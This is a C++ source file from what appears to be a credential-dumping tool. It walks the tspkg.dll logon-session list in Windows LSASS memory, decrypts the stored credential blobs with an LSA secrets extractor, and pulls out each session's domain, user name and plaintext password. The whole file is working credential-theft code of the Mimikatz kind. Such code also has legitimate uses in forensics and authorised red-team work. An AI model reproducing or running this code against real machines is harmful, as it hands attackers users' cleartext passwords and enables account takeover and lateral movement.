#include "lsa/tspkg_walker.h"

#include "core/signature_scanner.h"
#include "core/text_utils.h"
#include "lsa/reader_utils.h"

#include <algorithm>
#include <cstring>
#include <set>

namespace kvc::lsa {

namespace {

void parse_blob(const std::vector<std::byte>& dec, std::size_t skip,
                std::string& domain, std::string& user,
                std::string& password, std::string& password_hex) {
    constexpr std::size_t kHeader = 3 * 16;
    if (dec.size() < skip + kHeader) return;
    const std::byte* p = dec.data() + skip;

    std::uint16_t dom_len = 0, dom_max = 0, usr_len = 0, usr_max = 0, pwd_len = 0, pwd_max = 0;
    std::memcpy(&dom_len, p + 0, 2); std::memcpy(&dom_max, p + 2, 2);
    std::memcpy(&usr_len, p + 16, 2); std::memcpy(&usr_max, p + 18, 2);
    std::memcpy(&pwd_len, p + 32, 2); std::memcpy(&pwd_max, p + 34, 2);

    if ((dom_len & 1) || (usr_len & 1) || (pwd_len & 1)) return;
    if (dom_len > 512 || usr_len > 512 || pwd_len > 512) return;

    const std::size_t data_start = skip + kHeader;
    const std::size_t need = static_cast<std::size_t>(dom_max) + usr_max + pwd_max;
    if (data_start + need > dec.size()) {
        if (skip > 0) parse_blob(dec, 0, domain, user, password, password_hex);
        return;
    }

    auto extract = [&](std::size_t off, std::uint16_t len) -> std::string {
        if (len == 0 || off + len > dec.size()) return {};
        return core::utf16le_to_utf8(std::span<const std::byte>(dec.data() + off, len));
    };

    std::size_t cur = data_start;
    domain = extract(cur, dom_len); cur += dom_max;
    user = extract(cur, usr_len); cur += usr_max;

    if (pwd_max > 0 && cur + pwd_max <= dec.size()) {
        const std::size_t take = pwd_len ? pwd_len : pwd_max;
        password_hex = core::bytes_to_hex(std::span<const std::byte>(dec.data() + cur, take));
        std::string candidate = extract(cur, pwd_len ? pwd_len : pwd_max);
        if (is_likely_readable_password(candidate)) password = std::move(candidate);
    }
}

} // namespace

TspkgWalker::TspkgWalker(const core::VirtualMemory& vmem,
                         const core::ModuleIndex& modules,
                         const security::LsaSecretsExtractor* extractor,
                         const templates::TspkgTemplateSpec* tmpl)
    : vmem_(vmem), modules_(modules), extractor_(extractor), tmpl_(tmpl) {}

void TspkgWalker::walk(std::vector<LogonSession>& sessions) const {
    if (!tmpl_ || tmpl_->signature.empty()) return;
    const auto* mod = modules_.find("tspkg.dll");
    if (!mod) return;

    const std::uint64_t sig_pos = core::scan_module_first(
        vmem_, *mod,
        std::span<const std::uint8_t>(tmpl_->signature.data(), tmpl_->signature.size()));
    if (sig_pos == 0) return;

    const std::uint64_t erl = sig_pos + static_cast<std::int64_t>(tmpl_->first_entry_offset);
    std::int32_t rel = 0;
    if (!vmem_.read_struct(erl, &rel)) return;
    const std::uint64_t sentinel = erl + 4 + static_cast<std::int64_t>(rel);

    const std::vector<std::uint64_t> sentinel_candidates = {sentinel, sentinel + 8};

    std::set<std::uint64_t> processed;
    for (const std::uint64_t ls : sentinel_candidates) {
        auto first = vmem_.read_u64(ls);
        if (!first || *first == 0 || *first == ls) continue;
        std::uint64_t current = *first;

        for (int safety = 0; current != ls && safety < 4096; ++safety) {
            if (!processed.insert(current).second) {
                auto next = vmem_.read_u64(current);
                if (!next) break;
                current = *next;
                continue;
            }

            const std::uint64_t luid = vmem_.read_u64(current + tmpl_->luid_offset).value_or(0);
            const std::uint16_t enc_len = vmem_.read_u16(current + tmpl_->primary_offset).value_or(0);
            const std::uint16_t enc_max = vmem_.read_u16(current + tmpl_->primary_offset + 2).value_or(0);
            const std::uint64_t enc_buf = vmem_.read_u64(current + tmpl_->primary_offset + 8).value_or(0);
            (void)enc_len;

            std::string domain, user, password, password_hex;
            if (enc_max > 0 && enc_buf != 0 && extractor_ && extractor_->is_initialized()) {
                std::vector<std::byte> enc(enc_max);
                if (vmem_.read_bytes(enc_buf, enc_max, enc)) {
                    auto dec = extractor_->decrypt(enc);
                    parse_blob(dec, tmpl_->blob_header_skip, domain, user, password, password_hex);
                }
            }

            if (luid != 0) {
                for (auto& s : sessions) {
                    if (s.authentication_id == luid) {
                        TspkgCredential c;
                        c.luid = luid;
                        c.username = user; c.domainname = domain;
                        c.password = password; c.password_hex = password_hex;
                        s.tspkg_credentials.push_back(std::move(c));
                        break;
                    }
                }
            }

            auto next = vmem_.read_u64(current);
            if (!next) break;
            current = *next;
        }
    }
}

} // namespace kvc::lsa
